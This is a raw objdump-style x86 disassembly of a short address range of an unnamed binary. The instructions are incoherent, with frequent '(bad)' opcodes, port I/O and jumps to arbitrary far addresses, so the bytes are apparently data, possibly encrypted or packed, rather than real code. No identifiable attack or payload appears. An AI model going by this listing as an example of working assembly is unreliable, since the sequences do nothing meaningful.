  4019b4:	lds    eax,FWORD PTR ds:0xab1ab190
  4019ba:	mov    ebx,0x2a254f0b
  4019bf:	fimul  DWORD PTR [edx-0x3fef1169]
  4019c5:	gs cmc 
  4019c7:	cmp    DWORD PTR [ebx-0x6d],0x51f795de
  4019ce:	jnp    0x401950
  4019d0:	in     eax,dx
  4019d1:	enter  0x1877,0xc3
  4019d5:	adc    edx,ebp
  4019d7:	or     edi,esi
  4019d9:	sbb    BYTE PTR [eax-0x30],ch
  4019dc:	imul   esp,DWORD PTR [ecx+0x375ca9e7],0xe9a5bb0
  4019e6:	shr    DWORD PTR [ecx+0x22],cl
  4019e9:	aam    0x87
  4019eb:	mov    WORD PTR [edx-0x41],es
  4019ee:	fild   DWORD PTR [edi-0x4e]
  4019f1:	inc    ebp
  4019f2:	lods   al,BYTE PTR ds:[esi]
  4019f3:	test   BYTE PTR [ebp+ecx*8+0x1197a0c2],0xda
  4019fb:	imul   esp
  4019fd:	mov    ebp,0x6c958c20
  401a02:	imul   edx,DWORD PTR [esi-0x510545e7],0xc0139cdc
  401a0c:	cmc    
  401a0d:	xor    BYTE PTR [ebp-0x1078e13e],bl
  401a13:	push   ebp
  401a14:	xchg   ecx,eax
  401a15:	cld    
  401a16:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a18:	aaa    
  401a19:	addr16 jne 0x401a8f
  401a1c:	mov    al,BYTE PTR [ecx+ebp*8]
  401a1f:	pop    esp
  401a20:	push   edi
  401a21:	out    dx,al
  401a22:	ins    BYTE PTR es:[edi],dx
  401a23:	bound  edi,QWORD PTR [ecx+0xa]
  401a26:	cs push 0xffffff8d
  401a29:	shl    BYTE PTR [esi+0x7babc6aa],1
  401a2f:	mov    bh,0x91
  401a31:	sub    bh,al
  401a33:	dec    eax
  401a34:	xchg   ebx,eax
  401a35:	add    eax,0xd7faf316
  401a3a:	mov    dh,0x9
  401a3c:	cmp    esp,edx
  401a3e:	sbb    dh,BYTE PTR [edi+0x23]
  401a41:	or     BYTE PTR [edi+0x765479f3],ch
  401a47:	ret    0x9d18
  401a4a:	push   edi
  401a4b:	sub    edi,edi
  401a4d:	aam    0x45
  401a4f:	sbb    ah,BYTE PTR [edi+0xb]
  401a52:	inc    bh
  401a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a55:	xchg   BYTE PTR [eax],cl
  401a57:	out    dx,al
  401a58:	sbb    DWORD PTR [edx+0x21],0x22dec8f8
  401a5f:	popf   
  401a60:	mov    edi,0xe5464ed1
  401a65:	stc    
  401a66:	in     eax,0x6d
  401a68:	scas   eax,DWORD PTR es:[edi]
  401a69:	pop    ds
  401a6a:	push   ds
  401a6b:	(bad)  
  401a6c:	adc    al,0x6b
  401a6e:	push   esp
  401a6f:	add    eax,0xf5d6c5f1
  401a74:	repnz push 0x42
  401a77:	ds jge 0x401af3
  401a7a:	adc    esp,eax
  401a7c:	push   DWORD PTR [ebx+edi*2+0x38c4e182]
  401a83:	pop    ss
  401a84:	mov    al,ds:0xf375c410
  401a89:	arpl   WORD PTR [esi-0x52],sp
  401a8c:	out    0x87,al
  401a8e:	dec    edi
  401a8f:	fs mov cs,ebp
  401a92:	into   
  401a93:	clc    
  401a94:	add    bl,BYTE PTR [edi-0x2cbe8c78]
  401a9a:	inc    ebx
  401a9b:	jg     0x401afa
  401a9d:	in     al,0xde
  401a9f:	pop    edx
  401aa0:	fucomp st(1)
  401aa2:	pusha  
  401aa3:	jne    0x401a7b
  401aa5:	push   ebx
  401aa6:	pop    edi
  401aa7:	scas   al,BYTE PTR es:[edi]
  401aa8:	pop    ecx
  401aa9:	and    eax,0x530dedeb
  401aae:	fstp   TBYTE PTR [ebx-0x6]
  401ab1:	xchg   BYTE PTR [ecx+ebp*4+0x37],al
  401ab5:	cli    
  401ab6:	inc    eax
  401ab7:	cdq    
  401ab8:	jno    0x401b05
  401aba:	xor    edi,edx
  401abc:	popf   
  401abd:	inc    edi
  401abe:	dec    edx
  401abf:	ins    DWORD PTR es:[edi],dx
  401ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ac1:	out    dx,eax
  401ac2:	bound  eax,QWORD PTR [ecx+0x2a]
  401ac5:	int    0xb1
  401ac7:	aad    0x66
  401ac9:	or     al,BYTE PTR [ebp+0x19ed9a94]
  401acf:	test   al,0x93
  401ad1:	aaa    
  401ad2:	fdivr  DWORD PTR [eax]
  401ad4:	inc    eax
  401ad5:	outs   dx,DWORD PTR ds:[esi]
  401ad6:	jbe    0x401b4d
  401ad8:	aaa    
  401ad9:	dec    edx
  401ada:	jae    0x401ae7
  401adc:	repz mov al,0xf4
  401adf:	sar    DWORD PTR [eax+0x67ae8e60],cl
  401ae5:	int3   
  401ae6:	mov    bl,0x1a
  401ae8:	push   edx
  401ae9:	nop    edx
  401aec:	daa    
  401aed:	add    cl,BYTE PTR [esi-0x5536fe7]
  401af3:	cdq    
  401af4:	or     cl,BYTE PTR [edx-0x46623be1]
  401afa:	ret    0xb664
  401afd:	inc    edx
  401afe:	cs and al,0x21
  401b01:	mov    edx,0x8ac96c9a
  401b06:	int3   
  401b07:	scas   eax,DWORD PTR es:[edi]
  401b08:	leave  
  401b09:	mov    bh,0xe0
  401b0c:	jl     0x401aa0
  401b0e:	ret    
  401b0f:	(bad)  
  401b10:	into   
  401b11:	test   DWORD PTR ds:[ebx-0x37],eax
  401b15:	pop    eax
  401b16:	jp     0x401b1f
  401b18:	jns    0x401b52
  401b1a:	sbb    BYTE PTR [ecx],0xa0
  401b1d:	enter  0x41f1,0xda
  401b21:	repz scas eax,DWORD PTR es:[edi]
  401b23:	(bad)  
  401b24:	into   
  401b25:	js     0x401b87
  401b27:	jp     0x401b74
  401b29:	fwait
  401b2a:	popa   
  401b2b:	or     edx,esi
  401b2d:	adc    bl,cl
  401b2f:	fstp   DWORD PTR [ebp+0x1d9c9794]
  401b35:	stc    
  401b36:	loopne 0x401b68
  401b38:	cpuid  
  401b3a:	push   es
  401b3b:	repnz adc DWORD PTR [ecx+0x430de06a],ebx
  401b42:	jmp    0x4edce22c
  401b47:	cmp    DWORD PTR [ecx+0x62],0x3d
  401b4b:	jle    0x401bcc
  401b4d:	sbb    ebp,ebp
  401b4f:	hlt    
  401b50:	addr16 gs leave 
  401b53:	xor    BYTE PTR [edi-0x1d],dh
  401b56:	xor    al,0x7a
  401b58:	xchg   DWORD PTR [eax+edi*8],ebp
  401b5b:	les    ebp,FWORD PTR [eax-0x4f]
  401b5e:	arpl   WORD PTR [edi],bx
  401b60:	pop    eax
  401b61:	icebp  
  401b62:	repnz icebp 
  401b64:	lds    edi,FWORD PTR [ebp-0x7d]
  401b67:	and    dh,bh
  401b69:	xchg   ebx,eax
  401b6a:	pop    esi
  401b6b:	mov    ds:0x4085ffcb,al
  401b70:	or     dl,BYTE PTR [ecx-0x1d]
  401b73:	iret   
  401b74:	xchg   esp,eax
  401b75:	sub    al,0x8c
  401b77:	dec    eax
  401b78:	mov    ecx,0xa11bb625
  401b7d:	add    ch,BYTE PTR [esi+ecx*8-0x47]
  401b81:	fcom   DWORD PTR [eax]
  401b83:	pushf  
  401b84:	ins    BYTE PTR es:[edi],dx
  401b85:	les    esi,FWORD PTR [esi]
  401b87:	or     dh,bl
  401b89:	out    dx,eax
  401b8a:	and    cl,al
  401b8c:	jle    0x401b44
  401b8e:	pop    edi
  401b8f:	dec    ebp
  401b90:	je     0x401bb7
  401b92:	jbe    0x401b17
  401b94:	fadd   QWORD PTR [eiz*2+0x376c35e1]
  401b9b:	mov    bl,0x41
  401b9d:	in     eax,0x12
  401b9f:	add    eax,0x73e9e209
  401ba4:	sar    DWORD PTR [eax+edx*1+0x13],1
  401ba8:	lock fdiv QWORD PTR [ebx-0x2e1bdcab]
  401baf:	mov    ecx,0x8703e5f2
  401bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb5:	add    BYTE PTR [edi],dh
  401bb7:	loopne 0x401b62
  401bb9:	push   0xf80f40c8
  401bbe:	dec    eax
  401bbf:	xchg   DWORD PTR [edi],ecx
  401bc1:	cmp    BYTE PTR [ebx],bh
  401bc3:	jmp    0xf9a834b
  401bc8:	lods   al,BYTE PTR ds:[esi]
  401bc9:	sbb    BYTE PTR [ebp-0x2ad6f70a],dl
  401bcf:	push   ss
  401bd0:	cdq    
  401bd1:	xchg   BYTE PTR [esi+esi*8],dh
  401bd4:	(bad)  
  401bd5:	ins    BYTE PTR es:[edi],dx
  401bd6:	and    dl,BYTE PTR [ebx]
  401bd8:	sbb    edx,edi
  401bda:	and    dh,dl
  401bdc:	sub    esi,DWORD PTR [esi+0x4e]
  401bdf:	mov    dl,0x3e
  401be1:	cmp    al,BYTE PTR [esi-0x5e]
  401be4:	popf   
  401be5:	mov    ebp,0x3dd75e8f
  401bea:	inc    edx
  401beb:	mov    ebp,ebp
  401bed:	and    al,0x21
  401bef:	and    DWORD PTR [edi+0x3479d324],edx
  401bf5:	fwait
  401bf6:	bound  esp,QWORD PTR [ebp-0x31]
  401bf9:	mov    esp,0xa5a10156
  401bfe:	daa    
  401bff:	pop    eax
  401c00:	or     BYTE PTR [edi-0x2575c7ce],0x5c
  401c07:	push   eax
  401c08:	aad    0xf4
  401c0a:	lea    eax,[ecx]
  401c0c:	ds in  eax,0xa
  401c0f:	pop    ecx
  401c10:	xchg   BYTE PTR [ecx-0x7f],bl
  401c13:	test   DWORD PTR [ecx+0x2189f5a8],0x358f82f1
  401c1d:	pop    es
  401c1e:	push   ds
  401c1f:	pop    ebx
  401c20:	test   BYTE PTR [esi+0x71],0x89
  401c24:	stos   DWORD PTR es:[edi],eax
  401c25:	mov    ecx,0x517f243
  401c2a:	mov    ebp,0x7efdfd85
  401c2f:	cmp    eax,0xb750b7bd
  401c34:	adc    dl,0xda
  401c37:	sub    BYTE PTR [ecx+ecx*1+0x11],cl
  401c3b:	inc    edx
  401c3c:	push   ecx
  401c3d:	cmp    DWORD PTR [ebp-0x3f],ebp
  401c40:	pop    edx
  401c41:	pop    ds
  401c42:	clc    
  401c43:	sar    BYTE PTR [eax-0x27],1
  401c46:	mov    esp,0x30b9ec0a
  401c4b:	fcmove st,st(1)
  401c4d:	inc    eax
  401c4e:	sub    al,0x16
  401c50:	adc    DWORD PTR [ebp+0x69],esp
  401c53:	dec    esp
  401c54:	jecxz  0x401c60
  401c56:	jge    0x401c01
  401c58:	popf   
  401c59:	sub    BYTE PTR [ebx-0x567b18c3],bl
  401c5f:	pop    edi
  401c60:	shl    DWORD PTR [esp+esi*1],cl
  401c63:	cmp    bl,ah
  401c65:	stos   BYTE PTR es:[edi],al
  401c66:	ja     0x401c31
  401c68:	push   ss
  401c69:	int    0x4
  401c6b:	not    BYTE PTR [edi+0x4b]
  401c6e:	adc    al,0xfe
  401c70:	jnp    0x401c8e
  401c72:	lea    ebp,[esi-0x1c26c829]
  401c78:	dec    ebx
  401c79:	xor    eax,0xa81af7dc
  401c7e:	mov    ch,0x9a
  401c80:	and    edx,DWORD PTR [edx+0x61a5c619]
  401c86:	addr16 into 
  401c88:	mov    ebp,0x39ad242a
  401c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c8e:	mov    cl,0xaf
  401c90:	fist   DWORD PTR [edx-0x22f12692]
  401c96:	mov    cl,0x7
  401c98:	clc    
  401c99:	push   0xf
  401c9b:	test   DWORD PTR [eax+0x7ebf7dd0],0x8e9cc2b3
  401ca5:	imul   eax,DWORD PTR [ebx],0x9d208fa0
  401cab:	xchg   ebp,eax
  401cac:	jge    0x401d13
  401cae:	dec    edi
  401caf:	cmc    
  401cb0:	sti    
  401cb1:	into   
  401cb2:	push   cs
  401cb3:	fistp  DWORD PTR ds:0xf5dc6a30
  401cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cba:	movsx  esi,WORD PTR [esp+esi*2-0x1]
  401cbf:	pop    esp
  401cc0:	(bad)  
  401cc1:	daa    
  401cc2:	test   ch,0x3f
  401cc5:	out    dx,al
  401cc6:	call   0xa701:0xa6145297
  401ccd:	xor    ebx,edi
  401ccf:	or     edi,DWORD PTR ds:0xf83a3329
  401cd5:	sbb    BYTE PTR [edx-0x22],ch
  401cd8:	stc    
  401cd9:	clc    
  401cda:	or     BYTE PTR [ebx],0xc1
  401cdd:	stos   BYTE PTR es:[edi],al
  401cde:	out    0xec,al
  401ce0:	mov    al,0x6b
  401ce2:	or     BYTE PTR ds:0x2e458693,dh
  401ce8:	inc    eax
  401ce9:	mov    eax,ds:0xdf923036
  401cee:	adc    BYTE PTR [eax],al
  401cf0:	pop    ebx
  401cf1:	cs mov ebp,0x34c7a868
  401cf7:	mov    ecx,0x9f0ef5f6
  401cfc:	(bad)  
  401cfd:	and    dl,BYTE PTR [edi]
  401cff:	mov    ebp,ecx
  401d01:	shr    DWORD PTR [ecx],0x58
  401d04:	and    eax,esp
  401d06:	daa    
  401d07:	cmc    
  401d08:	pop    ecx
  401d09:	inc    DWORD PTR [ecx-0x3c]
  401d0c:	xor    al,0x0
  401d0e:	cdq    
  401d0f:	repnz cmp al,0x56
  401d12:	lahf   
  401d13:	xor    al,0x71
  401d15:	mov    edi,db5
  401d18:	retf   0xd795
  401d1b:	mov    cl,0x70
  401d1d:	loopne 0x401ce4
  401d1f:	daa    
  401d20:	fmul   QWORD PTR [eax+0x2ead78aa]
  401d26:	jae    0x401cff
  401d28:	or     eax,0x54d968a8
  401d2d:	je     0x401cc7
  401d2f:	ins    BYTE PTR es:[edi],dx
  401d30:	inc    esi
  401d31:	dec    edi
  401d32:	mov    ebx,0x17599dd7
  401d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d38:	imul   ebp,DWORD PTR [ecx],0x65e0061f
  401d3e:	inc    sp
  401d40:	mov    esp,0x7e61266b
  401d45:	and    DWORD PTR [edx],edx
  401d47:	inc    edx
  401d48:	jnp    0x401d4f
  401d4a:	pop    esp
  401d4b:	leave  
  401d4c:	adc    ch,dh
  401d4e:	fdiv   DWORD PTR [esi-0x3a106004]
  401d54:	stos   BYTE PTR es:[edi],al
  401d55:	pop    ss
  401d56:	fld    DWORD PTR [esp+ebp*1-0x7a]
  401d5a:	mov    ebx,0xae675871
  401d5f:	xchg   esp,eax
  401d60:	xor    eax,esi
  401d62:	adc    BYTE PTR [ecx+0x5ea21c4],0xcb
  401d69:	in     al,0x6e
  401d6b:	shl    ebx,0x44
  401d6e:	call   0x7047:0x9e5c84a9
  401d75:	dec    edx
  401d76:	xlat   BYTE PTR ds:[ebx]
  401d77:	mov    eax,0x5b8c2bc7
  401d7c:	outs   dx,BYTE PTR ds:[esi]
  401d7d:	pop    ds
  401d7e:	fs in  eax,0x7
  401d81:	cmc    
  401d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d83:	push   es
  401d84:	mov    eax,ds:0xc87e5066
  401d89:	mov    cl,0x13
  401d8b:	push   esp
  401d8c:	pop    ds
  401d8d:	or     DWORD PTR [eax-0x910ba38],edi
  401d93:	mov    edi,0xa6a4f393
  401d98:	popf   
  401d99:	call   DWORD PTR [ebx+0x4]
  401d9c:	cmp    edx,DWORD PTR [ebx-0x1747f3d9]
  401da2:	(bad)  
  401da4:	mov    dl,0x5f
  401da6:	pop    esp
  401da7:	pop    edx
  401da8:	mov    BYTE PTR [ecx+0xc5fe16f],ah
  401dae:	outs   dx,BYTE PTR ds:[esi]
  401daf:	outs   dx,BYTE PTR ds:[esi]
  401db0:	adc    dh,BYTE PTR [ecx-0x38]
  401db3:	lock loop 0x401dd6
  401db6:	lahf   
  401db7:	rol    DWORD PTR [esi],1
  401db9:	nop
  401dba:	cli    
  401dbb:	cli    
  401dbc:	(bad)  
  401dbd:	fwait
  401dbe:	add    DWORD PTR [ecx],ecx
  401dc0:	adc    bl,BYTE PTR [ebp-0x447eca0]
  401dc6:	scas   al,BYTE PTR es:[edi]
  401dc7:	and    BYTE PTR cs:[esi+0x2],dl
  401dcb:	lahf   
  401dcc:	ret    
  401dcd:	out    dx,al
  401dce:	mov    al,ds:0x82919b16
  401dd3:	aas    
  401dd4:	outs   dx,DWORD PTR ds:[esi]
  401dd5:	jl     0x401dbe
  401dd7:	les    edx,FWORD PTR [ebx+0x41138d1e]
  401ddd:	mov    ch,0xc7
  401ddf:	es jns 0x401dc5
  401de2:	fwait
  401de3:	sbb    ah,BYTE PTR [eax+edi*1]
  401de6:	jae    0x401e64
  401de8:	in     eax,dx
  401de9:	mov    bh,BYTE PTR [ebx]
  401deb:	adc    al,0x9b
  401ded:	in     eax,dx
  401dee:	pop    ds
  401def:	jno    0x401e29
  401df1:	mov    dh,0x1e
  401df3:	test   al,0x2e
  401df5:	or     BYTE PTR [edi-0x7b],0xa9
  401df9:	jnp    0x401e12
  401dfb:	mov    ds,WORD PTR [esi]
  401dfd:	inc    ax
  401dff:	(bad)
  401e02:	aam    0xbe
  401e04:	sbb    al,al
  401e06:	inc    edi
  401e07:	repz inc edi
  401e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e0a:	imul   BYTE PTR [ecx+0x4519e5d]
  401e10:	pop    ecx
  401e11:	jns    0x401e8f
  401e13:	dec    eax
  401e14:	mov    bl,BYTE PTR [edx-0x5dbd5d38]
  401e1a:	call   0x5a5e58b2
  401e1f:	jmp    0x847:0x3862794f
  401e26:	jp     0x401de1
  401e28:	bound  esi,QWORD PTR [ecx]
  401e2a:	aam    0x32
  401e2c:	(bad)  
  401e2d:	mov    al,0x65
  401e2f:	mov    bl,0xf8
  401e31:	imul   esp,DWORD PTR [ebp-0x44cc05e7],0xdcf9e173
  401e3b:	std    
  401e3c:	jbe    0x401e67
  401e3e:	div    DWORD PTR [edi+ecx*2-0x367c736b]
  401e45:	or     eax,0xf78557f8
  401e4a:	and    al,0x88
  401e4c:	iret   
  401e4d:	mov    eax,0xfc56f8f1
  401e52:	sbb    ebp,DWORD PTR [eax+ebx*1]
  401e55:	mov    esp,0xe0715aa6
  401e5a:	scas   al,BYTE PTR es:[edi]
  401e5b:	popa   
  401e5c:	(bad)  [edx+0x117da876]
  401e62:	add    eax,0xe902b69d
  401e67:	xchg   edx,eax
  401e68:	mov    edx,0x5b1bb55b
  401e6d:	pop    es
  401e6e:	pop    ebp
  401e6f:	pop    ebp
  401e70:	je     0x401df9
  401e72:	retf   0xbfe8
  401e75:	jecxz  0x401e62
  401e77:	add    eax,ebx
  401e79:	dec    esp
  401e7a:	mov    ecx,0x213afa90
  401e7f:	cld    
  401e80:	stos   DWORD PTR es:[edi],eax
  401e81:	and    BYTE PTR ss:[ebp-0x35472c99],ch
  401e88:	cmp    ch,bl
  401e8a:	ins    DWORD PTR es:[edi],dx
  401e8b:	sbb    eax,0xf38bab9a
  401e90:	fld    DWORD PTR [edi+0x65d32113]
  401e96:	stos   BYTE PTR es:[edi],al
  401e97:	mov    ds:0x89f0b147,al
  401e9c:	sub    BYTE PTR [ecx+0x45a6be3a],ah
  401ea2:	repnz and DWORD PTR [eax],esi
  401ea5:	ror    BYTE PTR [esi-0x2b],cl
  401ea8:	jge    0x401eb5
  401eaa:	iret   
  401eab:	aad    0x19
  401ead:	in     eax,0xa7
  401eaf:	fstp   DWORD PTR [ebp+0x74]
  401eb2:	push   edi
  401eb3:	in     eax,dx
  401eb4:	jno    0x401e69
  401eb6:	outs   dx,BYTE PTR ds:[esi]
  401eb7:	shl    dl,1
  401eb9:	sbb    DWORD PTR [esi+ebp*4],ebx
  401ebc:	repnz test dl,dh
  401ebf:	ficomp DWORD PTR [ebx]
  401ec1:	ins    DWORD PTR es:[edi],dx
  401ec2:	push   esi
  401ec3:	mov    ds:0x7b9f92be,al
  401ec8:	mov    ds:0xbaaeaa22,eax
  401ecd:	sub    dh,BYTE PTR [eax+0x3fc3d6bc]
  401ed3:	pop    esi
  401ed4:	push   cs
  401ed5:	into   
  401ed6:	adc    eax,0x1228667b
  401edb:	push   es
  401edc:	xor    eax,0x17bc3aa5
  401ee1:	push   ecx
  401ee2:	enter  0xaa4b,0x86
  401ee6:	jne    0x401ea8
  401ee8:	inc    ebx
  401ee9:	jmp    0x1149:0x1b3f503f
  401ef0:	pop    ebx
  401ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ef2:	ds jno 0x401f53
  401ef5:	ins    DWORD PTR es:[edi],dx
  401ef6:	popf   
  401ef7:	push   ebx
  401ef8:	out    0x5b,al
  401efa:	jmp    0xb9f3:0x14aa6fdf
  401f01:	test   DWORD PTR [ecx-0x1c8452c5],0x335f4686
  401f0b:	pop    es
  401f0c:	adc    DWORD PTR [ecx+0x752ec182],0xc6f80ba2
  401f16:	jo     0x401f81
  401f18:	les    ebp,FWORD PTR [esi-0x3e159d06]
  401f1e:	aad    0xde
  401f20:	pop    esp
  401f21:	inc    esi
  401f22:	fwait
  401f23:	mov    bh,0xb9
  401f25:	dec    eax
  401f26:	mov    eax,0xf56be01b
  401f2b:	shl    DWORD PTR [ecx],0xff
  401f2e:	aas    
  401f2f:	adc    ecx,DWORD PTR [ebx+0x33]
  401f32:	popa   
  401f33:	mov    edi,0x4516b888
  401f38:	in     al,0xe0
  401f3a:	inc    esi
  401f3b:	or     DWORD PTR [ecx-0x12],esi
  401f3e:	mov    ds:0x653c20a8,eax
  401f43:	mov    ebx,esi
  401f45:	(bad)
  401f48:	(bad)  
  401f49:	sti    
  401f4a:	loope  0x401f77
  401f4c:	sub    DWORD PTR [eax-0x93db83b],ecx
  401f52:	jmp    0xc7d86fe8
  401f57:	imul   esi,DWORD PTR [edx],0xdac40947
  401f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f5e:	cmp    BYTE PTR [ebx+edx*1-0x12],ch
  401f62:	jbe    0x401f48
  401f64:	pop    ebx
  401f65:	pop    esp
  401f66:	push   cs
  401f67:	ss dec eax
  401f69:	mov    ebp,0x8ed98032
  401f6e:	mov    ds:0x48c55fe0,al
  401f73:	stos   DWORD PTR es:[edi],eax
  401f74:	jl     0x401f05
  401f76:	cli    
  401f77:	sti    
  401f78:	jmp    0x7122fb38
  401f7d:	inc    edx
  401f7e:	ficom  WORD PTR [ebp+0x23751474]
  401f84:	jg     0x401fdc
  401f86:	pushf  
  401f87:	dec    esi
  401f88:	lods   eax,DWORD PTR ds:[esi]
  401f89:	shr    DWORD PTR [edi-0xb],0xa6
  401f8d:	(bad)
  401f90:	mov    fs,WORD PTR [ebx+0x1b8bd14d]
  401f96:	dec    ecx
  401f97:	xchg   BYTE PTR [esp+ebx*1+0x1f],ch
  401f9b:	fs xchg esp,eax
  401f9d:	cdq    
  401f9e:	jno    0x401f58
  401fa0:	adc    al,0x92
  401fa2:	inc    eax
  401fa3:	xchg   esi,eax
  401fa4:	jne    0x401f65
  401fa6:	lods   eax,DWORD PTR ds:[esi]
  401fa7:	jmp    0x500013e9
  401fac:	jl     0x402020
  401fae:	das    
  401faf:	xor    eax,0xec630680
  401fb4:	jecxz  0x401fd2
  401fb6:	inc    ebp
  401fb7:	inc    bx
  401fb9:	out    0x0,eax
  401fbb:	fcmovne st,st(7)
  401fbd:	mov    ah,ch
  401fbf:	ror    BYTE PTR ds:0x5912b7ed,1
  401fc5:	pop    edx
  401fc6:	(bad)  
  401fc7:	(bad)  
  401fc8:	mov    ch,0xb2
  401fca:	(bad)  
  401fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fcc:	ficom  WORD PTR [edi+ebp*8]
  401fcf:	iret   
  401fd0:	mov    edx,0xbf897a14
  401fd5:	stos   DWORD PTR es:[edi],eax
  401fd6:	sar    DWORD PTR [edi],1
  401fd8:	mov    al,0x94
  401fda:	data16 sub BYTE PTR [ebx+0x6a7b4bbd],ah
  401fe1:	ret    
  401fe2:	and    BYTE PTR [esi],cl
  401fe4:	(bad)  
  401fe5:	xor    DWORD PTR [ebp-0x502aa443],eax
  401feb:	cmp    esi,DWORD PTR [edi+edx*4]
  401fee:	mov    gs,WORD PTR [eax-0x65]
  401ff1:	mov    eax,ds:0x84d8205c
  401ff6:	rcr    DWORD PTR [esi-0xaf66c4e],0xc
  401ffd:	fs ins DWORD PTR es:[edi],dx
  401fff:	inc    eax
  402000:	xor    DWORD PTR [edi],esi
  402002:	rol    ah,cl
  402004:	ds ret 0x4dc7
  402008:	aaa    
  402009:	adc    eax,0x6ab37b0c
  40200e:	mov    ds:0xb9b52eb7,al
  402013:	fsub   QWORD PTR [edi+0x7b]
  402016:	(bad)  
  402018:	xor    bl,0x44
  40201b:	inc    edx
  40201c:	sub    ebx,DWORD PTR [ebp+0x13]
  40201f:	cs jo  0x40209a
  402022:	in     al,0x8e
  402024:	mov    ds:0xa2c3a260,al
  402029:	int3   
  40202a:	cmp    BYTE PTR fs:[edi-0x42],ch
  40202e:	inc    esp
  40202f:	mov    bh,0x8a
  402031:	enter  0x3c10,0x22
  402035:	lods   al,BYTE PTR ds:[esi]
  402036:	adc    BYTE PTR [ebx*2-0x152fd152],ah
  40203d:	fisttp QWORD PTR [ecx+0x6d2d3878]
  402043:	scas   eax,DWORD PTR es:[edi]
  402044:	adc    eax,0xb02e085
  402049:	mov    DWORD PTR [edx],0xb0348fc2
  40204f:	xchg   ecx,eax
  402050:	dec    esi
  402051:	out    0xf1,eax
  402053:	add    ebx,ecx
  402055:	and    DWORD PTR [edx+ebp*1-0xcb05587],esp
  40205c:	xlat   BYTE PTR ds:[ebx]
  40205d:	fs or  eax,0x9b7cd0b3
  402063:	xchg   ecx,eax
  402064:	(bad)  
  402065:	retf   0x6fe8
  402068:	push   ebp
  402069:	push   edi
  40206a:	outs   dx,DWORD PTR ds:[esi]
  40206b:	or     ah,BYTE PTR [esi+0x32facfe5]
  402071:	mov    WORD PTR [eax],ds
  402073:	sub    bh,BYTE PTR [edi+0x410662c0]
  402079:	idiv   BYTE PTR [ebp+0x1f55513]
  40207f:	outs   dx,DWORD PTR ds:[esi]
  402080:	xchg   edi,eax
  402081:	retf   0xd89f
  402084:	mov    WORD PTR [esi],ds
  402086:	mov    esi,0x455a51b7
  40208b:	pop    ebx
  40208c:	(bad)  
  40208d:	(bad)  
  40208e:	not    DWORD PTR [esp+esi*4]
  402091:	data16 mov ds:0x33b4edc,al
  402097:	cmp    BYTE PTR [esi-0x6324d468],dh
  40209d:	je     0x4020a2
  40209f:	mov    esi,0x51baa73a
  4020a4:	jns    0x4020d7
  4020a6:	xlat   BYTE PTR ss:[ebx]
  4020a8:	xor    eax,0x26dd6fb9
  4020ad:	adc    al,0xe0
  4020af:	sub    eax,0xd8a4a88
  4020b4:	fcmovnb st,st(6)
  4020b6:	je     0x4020a6
  4020b8:	push   ebp
  4020b9:	jns    0x4020d7
  4020bb:	aaa    
  4020bc:	bound  edx,QWORD PTR [eax+ebp*8+0x65b209ff]
  4020c3:	pop    edi
  4020c4:	mov    DWORD PTR [eax],eax
  4020c6:	fist   WORD PTR ds:0xbfb7e083
  4020cc:	leave  
  4020cd:	mov    fs,WORD PTR [ecx]
  4020cf:	enter  0x3373,0x15
  4020d3:	mov    ecx,0x3deecb8c
  4020d8:	dec    eax
  4020d9:	fwait
  4020da:	push   esp
  4020db:	retf   0x3860
  4020de:	sbb    eax,DWORD PTR [esi]
  4020e0:	lods   al,BYTE PTR ds:[esi]
  4020e1:	stos   DWORD PTR es:[edi],eax
  4020e2:	inc    edx
  4020e3:	jle    0x40211a
  4020e5:	clc    
  4020e6:	xchg   DWORD PTR [edi],esp
  4020e8:	cli    
  4020e9:	iret   
  4020ea:	jecxz  0x4020a0
  4020ec:	push   edi
  4020ed:	outs   dx,DWORD PTR ds:[esi]
  4020ee:	or     ah,bl
  4020f0:	cmp    DWORD PTR [ecx*8-0x4d4810f3],ecx
  4020f7:	cwde   
  4020f8:	rcr    al,0x40
  4020fb:	inc    eax
  4020fc:	xlat   BYTE PTR ds:[ebx]
  4020fd:	xor    edx,0xffffffe3
  402100:	sub    DWORD PTR [edi],0xffffffda
  402103:	and    al,0x76
  402105:	and    eax,0x31bc3d6a
  40210a:	sbb    eax,0xf81030ac
  40210f:	out    dx,al
  402110:	in     eax,0x45
  402112:	jg     0x402102
  402114:	loopne 0x40217f
  402116:	add    edi,DWORD PTR [edi]
  402118:	xchg   edx,eax
  402119:	adc    eax,0xe4834fa6
  40211e:	iret   
  40211f:	sub    eax,0x9fb59baa
  402124:	rol    DWORD PTR [ebx],1
  402126:	fwait
  402127:	lahf   
  402128:	fs lock loop 0x402124
  40212c:	dec    edx
  40212d:	sub    esp,DWORD PTR [edx]
  40212f:	mov    esp,DWORD PTR [eax]
  402131:	mov    al,ds:0xa59bfed4
  402136:	imul   ecx,DWORD PTR [edi-0x74e4b05b],0xffffffff
  40213d:	mov    cl,0xa1
  40213f:	lods   eax,DWORD PTR ds:[esi]
  402140:	aad    0x63
  402142:	fimul  DWORD PTR [edi-0x5b]
  402145:	sbb    eax,0x1af23dee
  40214a:	cmc    
  40214b:	call   0x41ae:0x9f97d110
  402152:	mov    BYTE PTR [ecx+ebp*4],al
  402155:	push   ebx
  402156:	mov    eax,ds:0x7eff4dd2
  40215b:	and    ebp,DWORD PTR es:[ebx+0x40]
  40215f:	out    0x22,al
  402161:	mov    esp,0x6dd563c6
  402166:	in     al,0x96
  402168:	jno    0x40210e
  40216a:	lea    edi,[edi+0x59c33fa1]
  402170:	inc    esp
  402171:	ret    0x3196
  402174:	jae    0x402166
  402176:	arpl   cx,di
  402178:	test   BYTE PTR [ebx-0x4b],dh
  40217b:	fs jo  0x40216a
  40217e:	mov    ds:0xf8cec536,al
  402183:	retf   0x401e
  402186:	pop    ebx
  402187:	test   DWORD PTR [eax],edx
  402189:	aas    
  40218a:	in     eax,0x40
